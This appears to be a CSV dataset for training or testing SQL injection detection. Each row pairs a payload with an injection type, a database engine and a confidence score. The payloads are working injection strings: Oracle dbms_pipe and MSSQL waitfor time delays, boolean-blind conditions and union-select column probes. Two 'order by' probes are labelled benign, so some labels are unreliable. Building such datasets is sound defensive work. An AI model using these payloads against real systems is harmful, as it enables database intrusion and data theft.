id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
21846,"1 ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( 6312 = 6312",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
21801,waitfor delay '0:0:5' and 'fjpf' like 'fjpf,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
21844,"1"" waitfor delay '0:0:5'",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
21874,"-6520%"" ) order by 1#",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 21 chars.,2
21924,-4542' ) ) order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 22 chars.,2
21955,waitfor delay '0:0:5' and ( ( ( 'ywnm' = 'ywnm,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
21978,"1"" ) ) as eagr where 3366 = 3366 and elt ( 4249 = 4249,7259 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
21807,"1 ) ) as xvyi where 6701 = 6701 union all select null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
21808,"-7006' where 6966 = 6966 union all select 6966,6966,6966,6966#",union_based,generic,0.7,UNION-based payload detected. Payload length: 62 chars.,2
21813,"-1915%"" ) ) union all select 7732,7732,7732,7732,7732,7732,7732,7732,7732#",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
21823,"1"" ) where 2016 = 2016 and ( 1547 = 2093 ) *2093--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,2
21825,-6567' ) ) union all select 3217#,union_based,generic,0.7,UNION-based payload detected. Payload length: 33 chars.,2
